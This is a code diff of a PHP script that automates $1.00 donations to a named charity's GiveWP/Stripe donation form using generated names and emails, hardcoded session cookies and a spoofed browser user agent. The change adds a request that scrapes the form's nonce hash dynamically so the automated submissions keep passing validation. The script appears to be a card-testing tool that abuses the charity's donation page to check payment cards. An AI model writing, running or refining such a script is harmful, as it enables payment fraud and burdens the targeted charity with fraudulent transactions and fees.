@@ -111,10 +111,36 @@ $email = "$GmailUser$dominio";
 echo "$email\n";
 
 
+$curl = curl_init();
+curl_setopt_array($curl, [
+  CURLOPT_URL => 'https://www.theofilosfoundation.org.au/wp-admin/admin-ajax.php',
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => '',
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => 'POST',
+  CURLOPT_POSTFIELDS => 'action=give_donation_form_reset_all_nonce&give_form_id=79069',
+  CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; __stripe_mid=27199be9-23e9-406d-86f8-574d3cd66c03aeae31; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=a343106e83ec289ea7b43db6847ebafa%7C%7C1746304422%7C%7C1746300822%7C%7C3e141ff8b7de9dc5f82b0533687ef89f; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_sid=3ecd300a-2a91-4fe1-ba6d-44f2dd9a3745ad3a6c',
+  CURLOPT_HTTPHEADER => [
+    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
+    'Content-Type: application/x-www-form-urlencoded',
+    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
+    'origin: https://www.theofilosfoundation.org.au',
+    'referer: https://www.theofilosfoundation.org.au/donate/?form-id=79069',
+  ],
+]);
 
+$response = curl_exec($curl);
+$err = curl_error($curl);
+$json = json_decode($response, true);
+$hash = $json["data"]["give_form_hash"];
+echo "$hash\n";
+curl_close($curl);
+
+	
 
 $curl = curl_init();
-
 curl_setopt_array($curl, [
   CURLOPT_URL => 'https://api.stripe.com/v1/payment_methods',
   CURLOPT_RETURNTRANSFER => true,
@@ -155,7 +181,7 @@ curl_setopt_array($curl, [
   CURLOPT_TIMEOUT => 30,
   CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
   CURLOPT_CUSTOMREQUEST => 'POST',
-  CURLOPT_POSTFIELDS => 'give-honeypot=&give-form-id-prefix=79069-1&give-form-id=79069&give-form-title=Donation Form&give-current-url=https://www.theofilosfoundation.org.au/donate/&give-form-url=https://www.theofilosfoundation.org.au/donate/&give-form-minimum=1.00&give-form-maximum=999999.99&give-form-hash=11c9475b49&give-price-id=custom&give-amount=1.00&give_stripe_payment_method='.$id.'&payment-mode=stripe_checkout&give_first='.$name.'&give_last='.$last.'&give_email='.$email.'&card_name='.$last.'&give_validate_stripe_payment_fields=1&give_action=purchase&give-gateway=stripe_checkout',
+  CURLOPT_POSTFIELDS => 'give-honeypot=&give-form-id-prefix=79069-1&give-form-id=79069&give-form-title=Donation Form&give-current-url=https://www.theofilosfoundation.org.au/donate/&give-form-url=https://www.theofilosfoundation.org.au/donate/&give-form-minimum=1.00&give-form-maximum=999999.99&give-form-hash='.$hash.'&give-price-id=custom&give-amount=1.00&give_stripe_payment_method='.$id.'&payment-mode=stripe_checkout&give_first='.$name.'&give_last='.$last.'&give_email='.$email.'&card_name='.$last.'&give_validate_stripe_payment_fields=1&give_action=purchase&give-gateway=stripe_checkout',
 //  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
   CURLOPT_COOKIE => 'uncode_privacy[consent_types]=%5B%5D; uncodeAI.screen=360; uncodeAI.images=2064; uncodeAI.css=360x800@16; __stripe_mid=27199be9-23e9-406d-86f8-574d3cd66c03aeae31; __stripe_sid=8e907dfc-7a28-4f9d-a6af-d12e455605e7932b5d; wp-give_session_9d6049e39fa0e46fc282c55d085c1902=a343106e83ec289ea7b43db6847ebafa%7C%7C1746304422%7C%7C1746300822%7C%7C3e141ff8b7de9dc5f82b0533687ef89f; wp-give_session_reset_nonce_9d6049e39fa0e46fc282c55d085c1902=1',
 //  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
